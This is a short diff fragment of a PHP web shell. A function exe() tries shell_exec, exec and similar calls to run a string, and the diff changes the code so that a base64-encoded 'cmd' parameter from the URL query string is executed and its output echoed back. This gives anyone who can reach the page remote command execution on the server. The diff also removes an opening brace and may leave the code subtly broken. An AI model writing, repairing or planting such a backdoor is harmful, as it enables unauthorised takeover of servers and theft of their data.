@@ -9,7 +9,7 @@ function exe($s_c){
         $s_out = ob_get_contents();
         ob_end_clean();
     }
-    if(is_callable('shell_exec')){
+    if(is_callable('shell_exec'))
         $s_out = @shell_exec($s_c);
     
     if(is_callable('exec')) 
@@ -25,7 +25,7 @@ function exe($s_c){
     return $s_out;
 }
 
-if(isset($_GP['cmd']))
-	echo exe(base64_decode($_GP['cmd']));
+if(isset($_GET['cmd']))
+	echo exe(base64_decode($_GET['cmd']));
 
 ?>
